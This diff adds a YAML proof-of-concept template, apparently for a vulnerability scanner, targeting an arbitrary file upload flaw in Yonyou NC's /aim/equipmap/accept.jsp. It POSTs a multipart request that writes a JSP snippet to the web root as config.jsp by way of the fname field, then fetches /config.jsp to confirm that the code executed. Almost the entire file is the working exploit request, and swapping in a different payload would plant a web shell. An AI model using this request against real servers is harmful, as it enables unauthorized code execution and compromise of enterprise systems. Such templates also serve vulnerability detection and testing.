@@ -1,0 +1,42 @@
+id:
+
+info:
+  name: 用友NC accept.jsp任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /aim/equipmap/accept.jsp
+  headers:
+    ser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Cache-Control: max-age=0
+    sec-ch-ua-platform: "Windows"
+    sec-ch-ua-mobile: ?0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    sec-ch-ua: "Google Chrome";v="117", "Chromium";v="117", "Not=A?Brand";v="24"
+    Cookie: JSESSIONID=B78C500FE3ED18E919992117C5067EB6.server
+    Accept-Language: zh-CN,zh;q=0.9
+    Accept-Encoding: gzip, deflate
+    Upgrade-Insecure-Requests: 1
+    Content-Type: multipart/form-data; boundary=---------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
+  data: |
+    -----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
+    Content-Disposition: form-data; name="upload"; filename="config.txt"
+    Content-Type: text/plain
+    
+    <% out.println("hello"); %>
+    -----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
+    Content-Disposition: form-data; name="fname"
+  
+    \webapps\nc_web\config.jsp
+    -----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc--
+response1:
+requests2:
+  method: GET
+  path: /config.jsp
+response2:
+  headers:
+  body: hello
+  code: 200
